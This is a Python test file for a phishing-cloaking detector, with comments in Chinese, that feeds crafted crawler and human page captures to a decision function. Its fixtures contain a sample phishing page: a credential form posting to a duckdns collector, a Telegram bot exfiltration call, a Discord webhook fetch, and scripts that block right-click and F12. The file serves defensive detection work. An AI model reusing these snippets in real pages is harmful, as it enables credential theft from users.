"""
test_node4_cloaking.py — Node 4 雙瀏覽器布林判定自檢
執行: python test_node4_cloaking.py

不需要網路：直接餵造好的 BOT / HUMAN 爬取結果給 decide_cloaking。
"""
import sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from nodes.node4_cloaking_analyzer import decide_cloaking

URL = "https://portal-update.example.com/signin"

# 爬蟲看到的：乾淨的佔位頁，沒有任何惡意機制
CLEAN = """
<html><body><h1>Welcome</h1>
<p>Our service is currently under maintenance. Please check back later.</p>
</body></html>
"""

# 真人看到的：完整釣魚頁（表單送往免費主機 + Telegram 外洩 + 封鎖 F12）
MALICIOUS = """
<html><body oncontextmenu="return false;">
<form action="https://collector-9x.duckdns.org/next.php" method="post">
  <input type="text" name="email"><input type="password" name="password">
</form>
<script>
document.getElementById('password').value;
document.querySelector('[type="password"]');
fetch('https://api.telegram.org/bot123456789:AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1');
document.onkeydown = function(e){ if(e.keyCode === 123) return false; };
</script></body></html>
"""


def _r(html, *, status=200, error=None, chain=None, text=None):
    return {
        "html": html, "status_code": status, "error": error,
        "text_content": text if text is not None else ("x" * 200 if html else ""),
        "html_length": len(html), "redirect_chain": chain or [URL],
        "title": "", "final_url": URL,
    }


def test_bot_clean_human_malicious_is_cloaking():
    """核心情境：爬蟲拿到乾淨頁，真人拿到釣魚頁"""
    v = decide_cloaking(_r(CLEAN), _r(MALICIOUS), URL)
    assert v["verified"], v["evidence"]
    assert "C1" in v["fired"], v["fired"]
    assert not v["bot_mechanisms"], f"BOT 端不該有惡意機制: {v['bot_mechanisms']}"
    assert "webhook_exfiltration" in v["hidden_from_bot"], v["hidden_from_bot"]
    assert v["human_eval"]["is_phishing"] and not v["bot_eval"]["is_phishing"]


def test_both_malicious_is_phishing_not_cloaking():
    """兩端都給釣魚頁 → 是釣魚，但沒有對爬蟲隱藏，不算 Cloaking"""
    v = decide_cloaking(_r(MALICIOUS), _r(MALICIOUS), URL)
    assert not v["verified"], v["evidence"]
    assert not v["hidden_from_bot"]
    assert any("未對爬蟲隱藏" in e for e in v["evidence"]), v["evidence"]


def test_both_clean_is_not_cloaking():
    v = decide_cloaking(_r(CLEAN), _r(CLEAN), URL)
    assert not v["verified"]
    assert any("兩端皆未偵測到惡意機制" in e for e in v["evidence"]), v["evidence"]


def test_text_difference_alone_is_not_cloaking():
    """關鍵回歸：文字完全不同但兩端都沒有惡意機制 → 舊版相似度法會誤報"""
    zh = "<html><body><h1>歡迎光臨</h1><p>本站提供最新產品資訊與線上訂購服務。</p></body></html>"
    en = "<html><body><h1>Welcome</h1><p>Latest products and online ordering.</p></body></html>"
    v = decide_cloaking(_r(zh, text="歡迎光臨 本站提供最新產品資訊與線上訂購服務。"),
                        _r(en, text="Welcome Latest products and online ordering."), URL)
    assert v["content_similarity"] < 0.5, v["content_similarity"]
    assert not v["verified"], f"多語言頁面被誤判為 Cloaking: {v['evidence']}"


def test_identical_text_with_hidden_mechanism_is_cloaking():
    """關鍵回歸：文字幾乎相同但真人端多一支外洩腳本 → 舊版相似度法會漏報"""
    base = "<html><body><h1>Sign in</h1><p>Enter your credentials below.</p>{}</body></html>"
    bot   = base.format("")
    human = base.format(
        "<script>fetch('https://discord.com/api/webhooks/1/abc');</script>")
    v = decide_cloaking(_r(bot, text="Sign in Enter your credentials below."),
                        _r(human, text="Sign in Enter your credentials below."), URL)
    assert v["content_similarity"] > 0.95, v["content_similarity"]
    assert v["verified"], f"高相似度的隱藏機制未被抓到: {v['evidence']}"
    assert "webhook_exfiltration" in v["hidden_from_bot"]


def test_bot_blocked_is_cloaking():
    v = decide_cloaking(_r("", status=403), _r(CLEAN, status=200), URL)
    assert v["verified"] and "C2" in v["fired"], v["evidence"]


def test_redirect_fork_without_mechanism_diff_is_not_cloaking():
    """地理導向：分叉但兩端機制相同 → 不判 Cloaking"""
    # _redirect_forked 比的是網域，不是路徑
    v = decide_cloaking(
        _r(CLEAN, chain=[URL, "https://us.example.com/home"]),
        _r(CLEAN, chain=[URL, "https://tw.example.com/home"]), URL)
    assert not v["verified"], v["evidence"]
    assert any("地理/裝置導向" in e for e in v["evidence"]), v["evidence"]


if __name__ == "__main__":
    for fn in (test_bot_clean_human_malicious_is_cloaking,
               test_both_malicious_is_phishing_not_cloaking,
               test_both_clean_is_not_cloaking,
               test_text_difference_alone_is_not_cloaking,
               test_identical_text_with_hidden_mechanism_is_cloaking,
               test_bot_blocked_is_cloaking,
               test_redirect_fork_without_mechanism_diff_is_not_cloaking):
        fn()
        print(f"PASS  {fn.__name__}")
